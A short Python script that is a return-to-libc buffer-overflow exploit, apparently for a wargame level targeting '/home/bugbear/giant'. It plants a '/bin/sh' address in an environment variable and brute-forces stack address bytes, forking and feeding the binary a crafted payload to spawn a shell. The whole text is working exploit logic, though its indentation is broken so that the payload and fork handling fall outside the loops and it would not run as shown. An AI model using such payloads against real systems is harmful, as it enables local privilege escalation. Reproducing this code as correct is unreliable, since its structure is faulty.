import os
from struct import *

p = lambda x : pack("<L",x)
up = lambda x : unpack("<L",x)[0]

target="/home/bugbear/giant"
execve=0x400a9d48
binsh=0x400fbff9
null=0xbffffffc

os.putenv('moomoo',p(binsh))

for j in range(0xff,0,-1):
    for i in range(0xff,0,-1):
        pid = os.fork()

payload = "\x90"*44+p(execve)+"JUNK"+p(binsh)+chr(i)+chr(j)+"\xff\xbf"+p(null)


if pid == 0:
    print(hex(up(chr(i)+chr(j)+"\xff\xbf"))
          os.execv(target,[target,payload])
else:
    os.waitpid(pid,0)